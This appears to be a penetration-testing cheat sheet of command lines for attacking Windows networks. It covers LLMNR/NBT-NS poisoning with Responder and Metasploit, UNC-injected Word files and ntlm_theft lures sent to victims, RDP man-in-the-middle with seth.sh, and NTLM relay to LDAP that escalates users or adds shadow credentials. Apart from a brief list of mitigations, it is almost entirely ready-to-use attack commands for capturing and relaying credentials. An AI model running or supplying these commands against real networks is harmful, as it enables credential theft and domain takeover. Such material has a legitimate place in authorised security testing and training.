
#### LLMNR Poisoning Capture credentials :

using Responsder :
```bash
responder -I eth0
sudo responder -I eth0 -dwPv
responder -I eth0 -wd  #Starting wpad and DHCP server.
responder -I eth0 -A
responder -I eth0 -wdF -b #get clear text password , in victum browser run fun.local
responder -I eth0 -e 192.168.1.2
responder -I eth0 -wdF --lm --disable-es
```

using metasploit capture:
```
set JOHNPWFILE /path/to/store/john_hashes.txt
set CAINPWFILE /path/to/store/cain_hashes.txt

msfconsole -x "use auxiliary/server/capture/smb; set SRVHOST 192.168.178.136; set SRVPORT 445; set SMBDomain WORKGROUP; run"

# using spoofing:
msfconsole -q -x "use auxiliary/spoof/nbns/nbns_response; set SPOOFIP 192.168.1.103; set INTERFACE eth0; run; exit"

```

using unc injector:
```bash
msfconsole -q -x "use auxiliary/docx/word_unc_injector; set LHOST 192.168.1.103; run; exit"
#then start server/capture/smb
```


using ntlm_theft:
```bash
python3 ntlm_theft.py -g all -s 192.168.1.3 -f test
python3 ntlm_theft.py -g modern -s 192.168.1.3 -f ignite
#send the generated file to victums and then start listener
```

LLMNR Poisoning mitigation :
- "Turn OFF Multicast Name Resolution" under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in the Group policy editor.
- DIsable NBT-NS, naviage to Network Connections > Network Adaptor Properties > TCP/IPv4 Properties > Advanced tab > Wins tab and select "Disable NetBIOS over TCP/IP"
- Require good password policy 

#### RDP MITM :

```bash
./seth.sh <interface> <attacker ip> <victum ip> <DC ip>
./seth.sh eth0 192.168.154.137 192.168.154.131 192.168.154.134
#when victum domain admin group user try to connect to dc ip , account credentials we capture .
```

#### LDAP Relay :
```bash
#t: Target service (LDAP server or domain controller)
#-l: Directory to store loot (NTLM hashes, TGTs, etc.)
ntlmrelayx.py -t ldap://<DC_IP> -l lootdir/
ntlmrelayx.py -t ldaps://<DC_IP> -l lootdir/

ntlmrelayx.py -t ldap://<DC_IP> --no-smb-server
ntlmrelayx.py -t ldaps://<DC_IP> --add-computer
--delegate-access

ntlmrelayx.py -t ldaps://<DC_IP> --escalate-user <target-username>
ntlmrelayx.py -t ldaps://<DC_IP> --shadow-credentials
ntlmrelayx.py -tf targets.txt -l loot/
ntlmrelayx.py -t ldaps://<DC_IP> --http-port 80 --no-smb-server

```